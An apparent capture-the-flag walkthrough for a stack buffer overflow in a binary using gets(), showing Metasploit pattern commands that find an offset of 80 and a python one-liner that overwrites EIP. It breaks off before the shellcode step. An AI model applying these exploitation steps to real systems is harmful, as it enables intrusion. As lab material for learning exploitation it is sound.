```c
void p(void)
{
  uint address;
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((address & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",address);
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}

void main(void)
{
  p();
  return;
}
```

On this level, we can see that we don't have any function susceptible to open us a shell. Time to inject shellcode !

Let's first determine what's the offset our program will crash at. For that purpose, we can use Metasploit tools:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

This will create a payload full of unique character sequences, which will help us determine the exact position our program crashed at.

On the bottom, we can see the buffer address where the program crashed: `37634136`

We can therefore give it to another Metasploit program to determine the offset:

```bash
/usr/share/metasploit-framework/tools/exploit/./pattern_offset.rb -q 37634136
[*] Exact match at offset 80
```

We now need to find the address we want 

Now when we run the program with 80 characters, the behavior changes:

```bash
python -c "print ('A'*80 + '\x28\xf7\xff\xbf')" | ./level2 
(0xbffff728)
```

We can successfully overwrite `eip` here:

Now that we did that, we need to make sure `eip` points to somewhere in our shellcode. Since no ASLR happens here, we could just determine the address where our shellcode starts.
